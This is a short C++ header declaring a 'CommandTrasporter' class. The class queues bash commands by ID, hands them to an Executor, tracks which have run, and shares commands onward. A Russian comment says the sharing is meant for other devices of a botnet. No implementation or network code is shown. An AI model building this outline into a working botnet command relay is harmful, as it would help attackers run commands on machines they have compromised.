#ifndef COMMANDTRASPORTER_H
#define COMMANDTRASPORTER_H
#include "executor.h"
#include <iostream>
#include <string>
#include <map>


class CommandTrasporter
{
public:
    CommandTrasporter();
    bool addCommand(std::string command, int id); // добавть команду
    void update(); // забрвть все id выполненных у Executor или обновить _commandsState список
    std::map<int, std::string>  shareCommands(); //команды для отправки другим устройствам ботнета????
    void saveExecutedId();

private:
    void getExecutedCommandsId(int * list); // можно было б чего то типо списка импортировать. Незнаю пока венуть список последних выполненных комманд для запсис
    void loadIdCommandsFromDrive();
    void sendCommandToExecutor();
    std::map<int, bool> _commandsState; // id, state
    std::map<int, std::string> _commandsForShare; //id text(bash)
    //вся реализация с файлами будет добавлена после готовности saver класса
    Executor _executor;
};

#endif // COMMANDTRASPORTER_H
